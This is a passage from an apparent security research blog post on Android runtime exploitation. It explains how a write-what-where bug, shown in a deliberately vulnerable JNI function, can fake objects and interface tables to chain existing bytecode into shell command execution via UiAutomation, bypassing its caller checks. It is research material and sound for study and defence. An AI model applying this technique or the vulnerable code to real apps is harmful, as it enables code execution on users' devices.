than a successful local attacker, according to other research the installation of some arbitrary, potentially malicious app is no unrealistic assumption!\nAgain, for simplicity, the local attacker is represented by a \u0026ldquo;simple\u0026rdquo; python script that emulates app interactions via socket communication. Therefore, when working with fork server - related information leaks, instead of writing an app that parses its own process image, the python script is simply given addresses taken from gdb. This requires caution to not use any app - specific addresses. In order to ensure that only fork server - related leaks are used by the script, the attack must be successful over multiple app restarts!\nFor the same reasons discussed for bytecode injection, a vulnerable app is created. However, the app itself does not provide any information leaks, but only the ability to repeatedly invoke a write - what - where (WWW) condition. I.e. an attacker is able to directly specify a value and an address to write the value to. The goal then is to derive a generic exploitation technique that reuses existing bytecode in the target app. Again, a WWW, while a very strong primitive, is only an example vulnerability to ease testing and demonstrating different attacks. It does not yield any benefit to artificially construct a complicated vulnerability! In fact, it would make the ~1000 LoC PoC for the WWW even longer and harder to read (although a python guru would most likely be able to squeeze my 1000 LoC into 10).\nBelow is the vulnerable native function accessible to an attacker.\nextern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_poc_poc_1local_MainActivity_www( JNIEnv *env, jclass clazz, jlong address, jlong value) __attribute__ ((optnone)) { *(uint64_t*)address = (uint64_t)value; } Next, as usual, a few basics must be discussed.\nNecessary Groundwork Luckily, the majority of basics is covered in a previous blog post. Therefore, the only mechanism left to understand is invoke-interface. Although we all love reading through tons of source code, I use a numbering scheme of the form [1], [2] etc. to mark points of interest in code. After the source code listings, these markings are summarized and discussed, so there is no need to fully read all source code snippets!\nInvoking Interface Methods The bytecode instruction invoke-interface is used in scenarios where polymorphism makes resolving the concrete method to call complicated. As the name suggests, this bytecode instruction can be utilized to invoke implementations of interface methods.\nBecause different types can implement the same interface, invoke-interface must be using a type - agnostic mechanism to resolve the method to invoke. This motivates to look further into the implementation of the bytecode instruction iteself, to identify how invoke-interface accesses objects and associated classes during method resolution and invocation. Remember that an attacker is able to inject data into the target process, including fake objects and classes.\nGeneric Analysis invoke-interface is fully defined by the assembly function invoke_interface. The code of invoke_interface reveals interesting properties about interface method resolution! Before delving into the details, lets build an example\ninterface Logger { void log(String message); } class FileLogger implements Logger { @Override public void log(String message) {/*...*/} } class ConsoleLogger implements Logger { @Override public void log(String message) {/*...*/} } class Test { public static void main(String[] args) { Logger[] loggers = new Logger[] { new FileLogger(), // =: fl new ConsoleLogger() // =: cl }; for (Logger logger : loggers) { logger.log(\u0026#34;Test123\u0026#34;); } } } In the following, fl and cl denote their respective instance of FileLogger and ConsoleLogger in the context of the above Java code example.\nCaching Interface Method First of all, invoke-interface starts off with a fast - path for interface method resolution. I.e. for finding the ArtMethod* representing the abstract method declared inside an interface. The caching mechanism can be seen below.\n%def fetch_from_thread_cache(dest_reg, miss_label): add ip, xSELF, #THREAD_INTERPRETER_CACHE_OFFSET // cache address ubfx ip2, xPC, #2, #THREAD_INTERPRETER_CACHE_SIZE_LOG2 // entry index add ip, ip, ip2, lsl #4 // entry address within the cache ldp ip, ${dest_reg}, [ip] // entry key (pc) and value (offset) cmp ip, xPC b.ne ${miss_label} Notice that the cache uses the current dex program counter xPC to derive the cache set (of size 1). If the entry in that cache set matches the xPC, then the corresponding value is loaded, i.e. the ArtMethod*.\nTherefore, it cannot be that the cached method represents a concrete implementation of the interface method. Consider the above example code. Invoking fl.log initially causes a cache miss, which triggers method resolution via nterp_get_method , i.e. NterpGetMethod . Thus, if the concrete implementation FileLogger::log was cached instead of a generic representation of Logger::log, then the second iteration trying to run cl.log would wind up calling fl.log again, because the current dex program counter causes a cache hit and thus triggers the fast - path, fully avoiding another method resolution. All of this implies that whatever is returned by NterpGetMethod must represent the abstract method declared in the interface, e.g. in Logger.\nMethod Resolution Via NterpGetMethod The first time a specific invoke-interface is executed during execution of an app will always cause a cache miss, unless the cache is initialized with some methods. NterpGetMethod is then used to find the corresponding ArtMethod* or an encoded version of the method index referencing the abstract method relative to a declaring .dex file.\nConsider the stripped version of NterpGetMethod:\nsize_t NterpGetMethod(Thread *self, ArtMethod *caller, uint16_t *dex_pc_ptr) REQUIRES_SHARED(Locks::mutator_lock_) { // [1] UpdateHotness(caller); const Instruction *inst = Instruction::At(dex_pc_ptr); InvokeType invoke_type = kStatic; uint16_t method_index = 0; switch (inst-\u0026gt;Opcode()) { // ... case Instruction::INVOKE_INTERFACE: { method_index = inst-\u0026gt;VRegB_35c(); invoke_type = kInterface; break; } // ... default: LOG(FATAL) \u0026lt;\u0026lt; \u0026#34;Unknown instruction \u0026#34; \u0026lt;\u0026lt; inst-\u0026gt;Opcode(); } ClassLinker *const class_linker = Runtime::Current()-\u0026gt;GetClassLinker(); /** * SkipAccessChecks() is a flag in the caller\u0026#39;s `access_flags_` field. * Apparently access checks are usually done for native, i.e. not * interpreted, code. * * Either class_linker-\u0026gt;ResolveMethod find the ArtMethod* in the DexCache, or * performs a manual resolution using the underlying .dex file. ASSUMING THE * LATTER, BECAUSE THIS CLEARLY SHOWS WHAT METHOD IS RETURNED. */ // [2] ArtMethod *resolved_method = caller-\u0026gt;SkipAccessChecks() ? class_linker-\u0026gt;ResolveMethod\u0026lt;ClassLinker::ResolveMode::kNoChecks\u0026gt;( self, method_index, caller, invoke_type) :class_linker-\u0026gt;ResolveMethod\u0026lt;ClassLinker::ResolveMode::kCheckICCEAndIAE\u0026gt;( self, method_index, caller, invoke_type); if (resolved_method == nullptr) { DCHECK(self-\u0026gt;IsExceptionPending()); return 0; } if (invoke_type == kSuper) { /*...*/ } if (invoke_type == kInterface) { size_t result = 0u; if (resolved_method-\u0026gt;GetDeclaringClass()-\u0026gt;IsObjectClass()) { /** * If declaring class is java.lang.Object: */ // Set the low bit to notify the interpreter it should do a vtable // call. DCHECK_LT(resolved_method-\u0026gt;GetMethodIndex(), 0x10000); result = (resolved_method-\u0026gt;GetMethodIndex() \u0026lt;\u0026lt; 16) | 1U; } else { DCHECK(resolved_method-\u0026gt;GetDeclaringClass()-\u0026gt;IsInterface()); DCHECK(!resolved_method-\u0026gt;IsCopied()); if (!resolved_method-\u0026gt;IsAbstract()) { /** * If declaring class is any non - abstract class: */ // Set the second bit to notify the interpreter this is a default // method. result = reinterpret_cast\u0026lt;size_t\u0026gt;(resolved_method) | 2U; } else { /** * If declaring class is abstract class (may still provide * definition): */ //[3] result = reinterpret_cast\u0026lt;size_t\u0026gt;(resolved_method); } } UpdateCache(self, dex_pc_ptr, result); return result; } else if (resolved_method-\u0026gt;GetDeclaringClass()-\u0026gt;IsStringClass() \u0026amp;\u0026amp; !resolved_method-\u0026gt;IsStatic() \u0026amp;\u0026amp; resolved_method-\u0026gt;IsConstructor()){ /*...*/} else if (invoke_type == kVirtual){ /*...*/} else{ /*...*/} } Above code is still complex, so consider the following explanation:\nGeneral information is extracted from bytecode. Most importantly, this is where a method invocation is classified as e.g. kInterface, i.e. an invoke-interface. The method_index refers to the method_id_item inside the declaring .dex file. Based on the method_index, the ClassLinker is utilized to resolve the corresponding ArtMethod*, i.e. the ART representation of a Java method. Interestingly, the calling method caller dictates whether validation checks are performed or not via its caller-\u0026gt;access_flags_ field. Invoking bytecode in a \u0026ldquo;benign way\u0026rdquo; should not trigger such checks. After a matching ArtMethod* has been found, its declaring_class is checked. This dictates whether the returned value is either a valid ArtMethod*, or encoded variant of either an ArtMethod* or a method_index. Under the assumption that the resolved_method represents an abstract interface method, its declaring_class field should be the declaring interface, e.g. Logger, which is neither java.lang.Object nor a concrete class. Hence, an ArtMethod* is returned as is, without any encoding. Following class_linker-\u0026gt;ResolveMethod gives insights into where ART searches for the ArtMethod*.\nClassLinker - based Method Resolution Consider the following reduced implementation of class_linker-\u0026gt;ResolveMethod :\ninline ArtMethod *ClassLinker::ResolveMethod(Thread *self, uint32_t method_idx, ArtMethod *referrer, InvokeType type) { // ... /** * Below comment implies that there exists an array of ArtMethods pointing * to native methods that are resolved at app startup. */ // We do not need the read barrier for getting the DexCache for the initial // resolved method // lookup as both from-space and to-space copies point to the same native // resolved methods array. // [1] ArtMethod *resolved_method = referrer-\u0026gt;GetDexCache\u0026lt;kWithoutReadBarrier\u0026gt;()-\u0026gt;GetResolvedMethod( method_idx); /** * Method resolution using fast path failed, so resolve method manually. */ // [2] if (UNLIKELY(resolved_method == nullptr)) { referrer = referrer-\u0026gt;GetInterfaceMethodIfProxy(image_pointer_size_); ObjPtr\u0026lt;mirror::Class\u0026gt; declaring_class = referrer-\u0026gt;GetDeclaringClass(); StackHandleScope\u0026lt;2\u0026gt; hs(self); Handle\u0026lt;mirror::DexCache\u0026gt; h_dex_cache( hs.NewHandle(referrer-\u0026gt;GetDexCache())); Handle\u0026lt;mirror::ClassLoader\u0026gt; h_class_loader( hs.NewHandle(declaring_class-\u0026gt;GetClassLoader())); resolved_method = ResolveMethod\u0026lt;kResolveMode\u0026gt;(method_idx, h_dex_cache, h_class_loader, referrer, type); } // ... // Note: We cannot check here to see whether we added the method to the // cache. It might be an erroneous class, which results in it being hidden // from us. // [3] return resolved_method; } The above code does the following:\nTries to find the ArtMethod* in an associated DexCache. Notice that upon app creation, Zygote already sets up a DexCache, which means that all apps on the device know the address of at least one DexCache instance. In this case, it is assumed that we get a cache miss to further investigate how method resolution works. In reality, this may already mark the end of method resolution in case of a cache hit. In case of a cache miss the method is resolved by method_idx, which was taken from the fixed parameter of invoke-interface opcode. Finally, the ArtMethod* is returned. However, the comment states that resolving a method manually may bypass validation checks. This will not be a problem, if the checks are skipped anyways. Now comes the most interesting part of the method resolution, namely another ResolveMethod implementation:\ninline ArtMethod *ClassLinker::ResolveMethod(uint32_t method_idx, Handle\u0026lt;mirror::DexCache\u0026gt; dex_cache, Handle\u0026lt;mirror::ClassLoader\u0026gt; class_loader, ArtMethod *referrer, InvokeType type) { // Check for hit in the dex cache. ArtMethod *resolved = dex_cache-\u0026gt;GetResolvedMethod(method_idx); bool valid_dex_cache_method = resolved != nullptr; // = false if (kResolveMode == ResolveMode::kNoChecks \u0026amp;\u0026amp; valid_dex_cache_method) { /*...*/} /** * Uses .dex file to resolve the method_id of the method to be invoked. A * method_id consists of a `class_idx`, `proto_idx` and `name_idx`. For an * interface method, `class_idx` is expected to refer (within .dex file) to * an interface. * * Interestingly, to fake an interface method invocation, the only thing that * needs to be \u0026#34;not - faked\u0026#34; is the method_idx used to identify the * method_id. * For example, to fake a call to UiAutomation::executeShellCommand, it * suffices to know its method_idx (and DexCache). From there, the type is * inferred by the method_id data to be UiAutomation. In other words, when * creating a fake ArtMethod object, its declaring class must reference a * correct DexCache (shared by Zygote) and its method_idx must describe the * correct method. */ const DexFile \u0026amp;dex_file = *dex_cache-\u0026gt;GetDexFile(); const dex::MethodId \u0026amp;method_id = dex_file.GetMethodId(method_idx); ObjPtr\u0026lt;mirror::Class\u0026gt; klass = nullptr; if (valid_dex_cache_method) { /*...*/} else { // [1] // The method was not in the DexCache, resolve the declaring class. klass = ResolveType(method_id.class_idx_, dex_cache, class_loader); if (klass == nullptr) { /*...*/ return nullptr; } } /*...*/ if (!valid_dex_cache_method) { // [2] resolved = FindResolvedMethod( klass, dex_cache.Get(), class_loader.Get(), method_idx); } /*...*/ // If we found a method, check for incompatible class changes. // [3] if (LIKELY(resolved != nullptr) \u0026amp;\u0026amp; LIKELY(kResolveMode == ResolveMode::kNoChecks || !resolved-\u0026gt;CheckIncompatibleClassChange(type))) { return resolved; } else { // If we had a method, or if we can find one with another lookup type, // it\u0026#39;s an incompatible-class-change error. /*...*/ return nullptr; } } Again, consider the following explanations:\nIf the method is not part of the DexCache, the class associated with the method referenced by method_idx will be resolved. This is where .dex is explicitly used to extract the method_id_item. Then, the ArtMethod* is resolved based on that class and method_idx. With a resolved method at hand, some mandatory validation checks are performed before the method is returned. Skipping some intermediate methods, eventually FindInterfaceMethodWithSignature is invoked:\nstatic inline ArtMethod *FindInterfaceMethodWithSignature(ObjPtr\u0026lt;Class\u0026gt; klass, std::string_view name, const SignatureType \u0026amp;signature, PointerSize pointer_size) REQUIRES_SHARED(Locks::mutator_lock_) { // If the current class is not an interface, skip the search of its declared // methods; such lookup is used only to distinguish between // IncompatibleClassChangeError and NoSuchMethodError and the caller has // already tried to search methods in the class. // [1] if (LIKELY(klass-\u0026gt;IsInterface())) { // Search declared methods, both direct and virtual. // (This lookup is used also for invoke-static on interface classes.) for (ArtMethod \u0026amp;method : klass-\u0026gt;GetDeclaredMethodsSlice(pointer_size)) { if (method.GetNameView() == name \u0026amp;\u0026amp; method.GetSignature() == signature) { return \u0026amp;method; } } } // TODO: If there is a unique maximally-specific non-abstract superinterface // method, we should return it, otherwise an arbitrary one can be returned. /** * Check all interfaces specified in iftable of the class. This gives the * ArtMethod of the interface method, not its concrete implementation! For * an invoke-interface opcode, `klass` is currently a class that provides a * concrete implementation. * Thus `klass` skips the above `klass-\u0026gt;IsInterface()` check and its iftable * is read. * THEREFORE, IFTABLE OF A CLASS SPECIFIES IMPLEMENTED INTERFACES. */ // [2] ObjPtr\u0026lt;IfTable\u0026gt; iftable = klass-\u0026gt;GetIfTable(); for (int32_t i = 0, iftable_count = iftable-\u0026gt;Count(); i \u0026lt; iftable_count; ++i) { ObjPtr\u0026lt;Class\u0026gt; iface = iftable-\u0026gt;GetInterface(i); for (ArtMethod \u0026amp;method : iface-\u0026gt;GetVirtualMethodsSlice(pointer_size)) { if (method.GetNameView() == name \u0026amp;\u0026amp; method.GetSignature() == signature) { return \u0026amp;method; } } } /*...Check super classes and java.lang.Object, or fail and return nullptr*/ return nullptr; } In a nutshell, method resolution boils down to iterating over the klass-\u0026gt;iftable_ field and checking all methods of all implemented interfaces for a matching method signature. To that end:\nInitially, the klass is still a class with the concrete implementation of the interface method. For example, this could still be FileLogger or ConsoleLogger, but not Logger. Classes that implement an interface use an interface table that describes where to find the concrete implementations of an implemented interface. This table is enumerated and each interface is checked for whether it declares a method that matches the signature of the method to be invoked by invoke-interface. Whatever method matches (first; although signatures should be unique) is returned. This concludes the quick dive into method resolution. Overall, executing invoke-interface tries to find the abstract method declared in the interface based on the method index that is a fixed operand of the invoke-interface opcode. Eventually, whatever is returned from NterpGetMethod is cached, so that future executions that pass the dex program counter of the invoke-interface can take the fast path.\nInterface Method Tables Going back to the implementation of invoke-interface, the following code remains to be understood:\n/** * At this point, x26 is either * - ArtMethod* describing the declared method to be invoked, or * - Encoded method index */ // First argument is the \u0026#39;this\u0026#39; pointer. /** * w1=index of this-register */ FETCH w1, 2 .if !$range and w1, w1, #0xf .endif /** * w1=this */ GET_VREG w1, w1 // Note: if w1 is null, this will be handled by our SIGSEGV handler. /** * w1=Class object of this */ // ============[1] ldr w2, [x1, #MIRROR_OBJECT_CLASS_OFFSET] // Test the first two bits of the fetched ArtMethod: // - If the first bit is set, this is a method on j.l.Object // - If the second bit is set, this is a default method. /** * Implicit assumption that ArtMethod* are 4-byte aligned. */ tst w26, #0x3 b.ne 3f /** * Case: Non - abstract class, but not java.lang.Object. * Query w3=imt_index_ from ArtMethod* of the interface method (abstract * method). */ // ============[2] ldrh w3, [x26, #ART_METHOD_IMT_INDEX_OFFSET] 2: /** * Use first entry of embedded vtable, i.e. Interface Method Table pointer * with imt_index_ to select the concrete implementation of the interface * method. */ // ============[3] ldr x2, [x2, #MIRROR_CLASS_IMT_PTR_OFFSET_64] ldr x0, [x2, w3, uxtw #3] /** * x0 holds concrete implementation, i.e. an ArtMethod* */ .if $range b NterpCommonInvokeInterfaceRange .else // ============[4] b NterpCommonInvokeInterface .endif Although all parts are relevant, the following main steps are taken:\nw1 is equal to this, i.e. the pointer to the object used for invocation. E.g. in fl.log(\u0026quot;Test\u0026quot;) that would be fl, not FileLogger, not Logger and also not log! Basically, w1 contains the receiving object. Then w2 contains the pointer to the class of w1, i.e. a mirror::Class*. Furthermore, the least - significant 2 bits of the resolved ArtMethod* (or encoded method index) are checked. This stems from NterpGetMethod, which is assumed to have simply returned a not - encoded ArtMethod*. Hence, the branch is not taken. Next, the resolved_method-\u0026gt;imt_index_ is extracted into w3. This selects the concrete implementation of the resolved method. Then, the actual ImTable* is read from the first entry of the embedded vtable. Using the imt_index_ scaled by the size of a ArtMethod*, x0 is set to be the concrete implementation of the resolved abstract method. Finally, NterpCommonInvokeInterface is used to invoke the concrete implementation. Observe that the concrete method invocation is basically just a lookup in the ImTable*, which is similar to a vtable in C++ and stored inside the embedded vtable of the Class. A Class is referenced by an object. Therefore, if an attacker controls an object, then the attacker can also reference a fake Class and thus a fake ImTable*. Overall, hijacking an object gives an attacker control over what methods are invoked during invoke-interface!\nThis of course requires knowledge on some internal values, among which reside:\nclass_idx of the class providing the concrete implementation. It should not be possible to inject a custom class with invalid class_idx, because either type resolution goes through DexCache or the associated .dex file. If neither contain the type, an error is raised. Valid iftable that states that a particular interface is implemented by the fake class. Technically, an iftable will not be needed if the fast - path is taken or the method_index can be resolved by the DexCache. Valid embedded_vtable, which references an ImTable in its first entry. It is possible to overlap the following vtable entries and the ImTable. As a rule of thumb:\nWhen creating a fake object and class, try to build as valid structures as feasible.\nIn other words, no need to be fancy with complex overlapping pointers etc, because the probability that some code inside the enormous ART code base validates or tries to work with the fake structures is pretty high (keyword: garbage collector). The exception to this rule of thumb is overlapping the ImTable with the embedded vtable, because it is an easy and almost foolproof way to save some space.\nGoal With the theory out of the way, we again settle for arbitrary command execution in the context of the vulnerable app. For simplicity, the goal is to eventually invoke Runtime.getRuntime().exec(\u0026quot;\u0026lt;command\u0026gt;\u0026quot;). However, it is forbidden to inject bytecode into the target process. It is only allowed to either inject data, i.e. objects, classes and more. Also, only existing bytecode may be reused. Trivially, using native techniques as intermediate step to gain bytecode execution is also forbidden.\nCore Idea As mentioned before, bytecode reuse draws from various fields of offensive security. To be precise, we use\nCounterfeit Object Oriented Programming (COOP) : An exploitation technique for memory errors in C++ programs that is based on fake object injection and vtable pointer manipulation. Insecure Deserialization: A vulnerability that allows an attacker to determine the data to be deserialized by the target app. For this post, the idea of gadget chains is critical. Without diving into all the rabbit holes I found myself in during research, the overall idea is to identify a good sequence of invoke-interface bytecode instructions. For example, the chain could look like this.objA.funcA(this.objB). It is important to note that the \u0026ldquo;surrounding\u0026rdquo; object represented by this is controlled by an attacker. Thus, an attacker also controls objA and objB. If an attacker controls objA, it may be possible to control what function is invoked. This is due to the fact that an attacker can choose the composition of an ImTable of a fake object.\nCOOP vs. Gadget Chains For those interested in or familiar with COOP, the original approach using a main loop gadget does not work well with bytecode. The most limiting factor is passing arguments from one gadget to another. Consider the following setup:\ninterface Observer { void invoke(Object data); } ... Observer[] observers = ...; ... for (Observer o : observers) { o.invoke(...); } Basically, the o.invoke invocation internally uses an invoke-interface bytecode instruction. This means an attacker can inject an array of fake objects that provide their own implementations of Observer::invoke through their fake class definitions. Now, being able to execute an arbitrary list of methods will be useful, if either the methods do not need to cooperate or use a shared object to pass (intermediate) results. Unfortunately, the approach of using spilled hardware registers or the stack to pass data between gadgets is not (easily) applicable to bytecode. Also using vregs and vrefs does not work, because these are cleared when nterp sets up the execution environment for a method. Therefore, at best, there is a global object referenced by the methods invoked via fake objects, or the object passed as parameter is usable in some way. Notice that both approaches drastically restrict the set of available gadgets. Being able to invoke a sequence of methods that is semantically equivalent to System.exec(\u0026quot;\u0026lt;command\u0026gt;\u0026quot;) seems like a daunting and impossible task.\nThis is the reason why we abstract away from the structure used in COOP attacks shown above, i.e. the for - loop over a fake object array. Observe that every piece of Java code that uses invoke-interface is a potential structure, including this.objA.funcA(this.objB), which could translate to this.shell.executeShellCommand(this.commandString). Again, notice the combination of COOP and gadget chains from insecure deserialization: invoke-interface uses the IMT of a class to determine the interface method implementation to invoke, and the structure gives the framework or layout to be adhered to.\nHigh - Level Solution To reach the goal, the structure this.objA.func(this.objB) is used. An attentive reader may realize that the structure does not match Runtime.getRuntime().exec(\u0026quot;\u0026lt;command\u0026gt;\u0026quot;). In order to make them match, it would be required that objA = \u0026lt;Runtime instance\u0026gt;. Unfortunately, we cannot assume that the location of a Java object in memory remains the same across all apps forked from zygote64, due to garbage collection. Creating a fake runtime is also infeasible due to the complexity and relevance of that object. However, it may be possible to create a fake object that provides a method, which eventually triggers execution of Runtime.getRuntime().exec(\u0026quot;\u0026lt;command\u0026gt;\u0026quot;), where the command string is also controllable.\nWithout showing the time - consuming search for candidate gadgets, which has been supported by some static analysis of .dex files of framework.jar available in every app using a modified version of Topper, the classes of interest are VirtualKeyboard , UiAutomation and String .\nLets break down the overall approach. First of all, VirtualKeyboard::close provides the structure:\n@Override @RequiresPermission(android.Manifest.permission.CREATE_VIRTUAL_DEVICE) public void close() { try { // this.objA.funcA(this.objB) mVirtualDevice.unregisterInputDevice(mToken); } catch (RemoteException e) { throw e.rethrowFromSystemServer(); } } Mapping the structure to variable names yields:\nobjA = mVirtualDevice funcA = unregisterInputDevice mToken = objB Now, one might argue that objects are strictly typed and thus cannot be changed to different types, even at runtime. To that end, consider the bytecode of VirtualKeyboard::close below.\n[Index = 0xe8da, Offset = 0x4e85a8, Num Regs = 0x3]: public void VirtualKeyboard::close() 0000: IGET_OBJECT v0, v2, FIELD:VirtualKeyboard;-\u0026gt;mVirtualDevice:IVirtualDevice; 0004: IGET_OBJECT v1, v2, FIELD:VirtualKeyboard;-\u0026gt;mToken:IBinder; 0008: INVOKE_INTERFACE {v0, v1}, METHOD:IVirtualDevice;-\u0026gt;unregisterInputDevice(IBinder;)V 000e: NOP 0010: RETURN_VOID 0012: MOVE_EXCEPTION v0 0014: INVOKE_VIRTUAL {v0}, METHOD:RemoteException;-\u0026gt;rethrowFromSystemServer()RuntimeException; 001a: MOVE_RESULT_OBJECT v1 001c: THROW v1 Note: The annotations Override and RequiresPermission do not seem to be enforced at runtime or impact method invocation in any way, which seems to align with the definition .\nUnless VirtualKeyboard::close throws an exception, the method really consists of only 4 relevant instructions:\n0000: IGET_OBJECT v0, v2, FIELD:VirtualKeyboard;-\u0026gt;mVirtualDevice:IVirtualDevice; 0004: IGET_OBJECT v1, v2, FIELD:VirtualKeyboard;-\u0026gt;mToken:IBinder; 0008: INVOKE_INTERFACE {v0, v1}, METHOD:IVirtualDevice;-\u0026gt;unregisterInputDevice(IBinder;)V 0010: RETURN_VOID Notice that iget-object vA, vB, field@CCCC does exactly as the name suggests: move the field with index CCCC of object referenced by vB into vreg vA. The last spark of hope is that iget-object checks the type of the fields it operates on. From fundamentals we get that method resolution using invoke-interface does not really care about the type of the involved objects, but rather only looks at the ImTable of the class of the receiving object. Now, lets rip apart the illusion of type checks at runtime by considering the implementation of iget-object :\n%def op_iget_object(): % op_iget(load=\u0026#34;ldr\u0026#34;, volatile_load=\u0026#34;ldar\u0026#34;, maybe_extend=\u0026#34;\u0026#34;, wide=\u0026#34;0\u0026#34;, is_object=\u0026#34;1\u0026#34;) %def op_iget(load=\u0026#34;ldr\u0026#34;, volatile_load=\u0026#34;ldar\u0026#34;, maybe_extend=\u0026#34;\u0026#34;, wide=\u0026#34;0\u0026#34;, is_object=\u0026#34;0\u0026#34;): % slow_path = add_slow_path(op_iget_slow_path, volatile_load, maybe_extend, wide, is_object) % fetch_from_thread_cache(\u0026#34;x0\u0026#34;, miss_label=slow_path) .L${opcode}_resume: lsr w2, wINST, #12 // w2\u0026lt;- B GET_VREG w3, w2 // w3\u0026lt;- object we\u0026#39;re operating on ubfx w2, wINST, #8, #4 // w2\u0026lt;- A cbz w3, common_errNullObject // object was null .if $wide $load x0, [x3, x0] SET_VREG_WIDE x0, w2 // fp[A] \u0026lt;- value .elseif $is_object // ===================[1] $load w0, [x3, x0] // ===================[2] TEST_IF_MARKING .L${opcode}_read_barrier .L${opcode}_resume_after_read_barrier: SET_VREG_OBJECT w0, w2 // fp[A] \u0026lt;- value .else $load w0, [x3, x0] SET_VREG w0, w2 // fp[A] \u0026lt;- value .endif FETCH_ADVANCE_INST 2 // ===================[3] GET_INST_OPCODE ip GOTO_OPCODE ip .if $is_object .L${opcode}_read_barrier: bl art_quick_read_barrier_mark_reg00 b .L${opcode}_resume_after_read_barrier .endif While there is nothing more refreshing than reading arm assembly mixed with custom macros, whose definitions are sprinkled over various files, below is the short version:\nAfter passing the caching mechanism, which sets x0 to the field offset in memory and is also used in invoke-interface, it is checked what kind of field is moved from the object in vB to vA. The code distinguishes between wide types like long and double, objects and the rest. As iget-object sets is_object = 1 when calling into op_iget, the object path is taken. Access the field at offset x0 relative to the base of object referenced by vB. This loads a 32-bit address into w0. Observe that x0 \u0026gt;= 8, because objects have predefined klass_ and monitor_ fields. Continue with the next instruction. The above code only tells half of the story, because a cache miss means the ArtField must be resolved using the slow path through nterp_get_instance_field_offset . Notice that even if the slow path performed type checks, any repeated execution of the iget-object instructions in VirtualKeyboard::close would use the fast path, unless their cache entries are evicted. Of course, it may be sufficient to only check the type in the slow path and then assume its correctness in the fast path.\nContinuing with the high - level approach, the structure provided by VirtualKeyboard::close is very dynamic at runtime, allowing an attacker to replace not only the objects but also their classes and thus their invoked methods. Now, looking into UiAutomation reveals the reason for why VirtualKeyboard::close is a suitable candidate for shell invocation :\npublic ParcelFileDescriptor executeShellCommand(String command) { warnIfBetterCommand(command); ParcelFileDescriptor source = null; ParcelFileDescriptor sink = null; try { ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe(); source = pipe[0]; sink = pipe[1]; // Calling out without a lock held. mUiAutomationConnection.executeShellCommand(command, sink, null); } catch (IOException ioe) { Log.e(LOG_TAG, \u0026#34;Error executing shell command!\u0026#34;, ioe); } catch (RemoteException re) { Log.e(LOG_TAG, \u0026#34;Error executing shell command!\u0026#34;, re); } finally { IoUtils.closeQuietly(sink); } return source; } Surprisingly, UiAutomation provides a convenience method for invoking shell commands. However, in comparison to Runtime.getRuntime().exec, it is a lot easier to create a fake UiAutomation object than it is to create a fake Runtime instance.\nThe key component in the above Java code is mUiAutomationConnection.executeShellCommand(command, sink, null). Without showing the entire call stack, eventually, the following code is called:\npublic void executeShellCommandWithStderr(final String command, final ParcelFileDescriptor sink, final ParcelFileDescriptor source, final ParcelFileDescriptor stderrSink) throws RemoteException { synchronized (mLock) { throwIfCalledByNotTrustedUidLocked(); throwIfShutdownLocked(); throwIfNotConnectedLocked(); } final java.lang.Process process; try { process = Runtime.getRuntime().exec(command); } catch (IOException exc) { throw new RuntimeException(\u0026#34;Error running shell command \u0026#39;\u0026#34; + command + \u0026#34;\u0026#39;\u0026#34;, exc); } ... } Basically, if an attacker is able to pass the methods throwIfCalledByNotTrustedUidLocked, throwIfShutdownLocked and throwIfNotConnectedLocked without crashing the app, then an attacker - chosen command will be executed. For simplicity, we do not care what happens after command execution. I.e. crashing the app after successful command execution is enough to prove that bytecode reuse attacks are possible.\nWithout further ado, consider the critical methods :\nprivate void throwIfShutdownLocked() { if (mIsShutdown) { throw new IllegalStateException(\u0026#34;Connection shutdown!\u0026#34;); } } private void throwIfNotConnectedLocked() { if (!isConnectedLocked()) { // Returns: this.mClient != null throw new IllegalStateException(\u0026#34;Not connected!\u0026#34;); } } private void throwIfCalledByNotTrustedUidLocked() { final int callingUid = Binder.getCallingUid(); if (callingUid != mOwningUid \u0026amp;\u0026amp; mOwningUid != Process.SYSTEM_UID \u0026amp;\u0026amp; callingUid != 0 /*root*/) { throw new SecurityException(\u0026#34;Calling from not trusted UID!\u0026#34;); } } Bypassing these checks is trivial, because the mUiAutomationConnection object of UiAutomation is also attacker - controlled. Therefore, setting the fields appropriately allows passing the checks. For example, throwIfNotConnectedLocked tries to enforce that this.mClient != null before the command is executed. Internally, this simply compares the field value in the mUiAutomationConnection object with 0. This means that setting mClient = 1 bypasses the check, although this is not a valid reference.\nLets conclude with a visualization of the entire high - level approach. First of all, we start off with the correct structure. Method invocation works with the correct objects and classes. However, after objects have been replaced with their fake counterparts, the invocation looks like can be seen below. Observe that the overall structure remains the same, only objects, classes and associated method implementations change. As the latter image already shows, when looking for the method to invoke via invoke-interface, nterp uses the fake class and eventually the .dex file associated with that class. After the abstract method has been resolved, the abstract method\u0026rsquo;s imt_index_ field is used to choose the correct ImTable entry. Therefore, the ImTable may be shrinked to only account for the lookup of the entry at index imt_index_. Because nterp uses whatever method is found in the ImTable, invocation of executeShellCommand is inevitable.\nLong story short, not only is an attacker able to inject fake objects, classes, ArtMethods, ArtFields and tables, but it is also possible to force existing bytecode to operate on those fake structures. In a nutshell, an attacker can convert the WWW condition into a type confusion and trick the interpreter to work with custom objects, causing invocation of arbitrary methods at runtime (of course, method signatures should match).\nKicking Off Execution Building on the blog posts covering Android basics for bytecode exploitation, the GRANDFATHERED map can be used to kick off execution of the chain that executes a shell command. To that end, reconsider the following code:\nclass LanguageTag { ... private static final Map\u0026lt;String, String[]\u0026gt; GRANDFATHERED = new HashMap\u0026lt;\u0026gt;(); ... public static LanguageTag parse(String languageTag, ParseStatus sts) { ... String[] gfmap = GRANDFATHERED.get(LocaleUtils.toLowerString(languageTag)); ... } } Observe that the invocation GRANDFATHERED.get uses invoke-interface again, because GRANDFATHERED is a HashMap, but ::get is declared in Map interface. Therefore, using a similar approach as discussed above, GRANDFATHERED can be replaced with an instance of VirtualKeyboard, and the invocation of ::get can be redirected to VirtualKeyboard::close. Setting up the VirtualKeyboard instance to contain instances of UiAutomation and String for mVirtualDevice and mToken, respectively, allows kicking off command execution. What is more is that LanguageTag::parse is most likely called inside a lifecycle method like onStop, which guarantees execution of the gadget chains.\nBecause GRANDFATHERED seems to be located inside the boot.art memory region, which again seems to be shared by all maps, it is a relatively stable target to abuse in the test environment.\nProof of Concept The concrete PoC code is about 1000 LoC, because we need to respect structures like mirror::Class etc. Encoding these structures in Python bloats up the PoC. However, the quintessence is exactly what is discussed in the above sections. For a visual proof, consider the following PoC video.\nIt is important to note that the memory region, in which fake objects are built up using the WWW condition, must be in a 32 - bit address range, because references to objects and classes must be 32 - bit addresses. In case of the above video, that region is 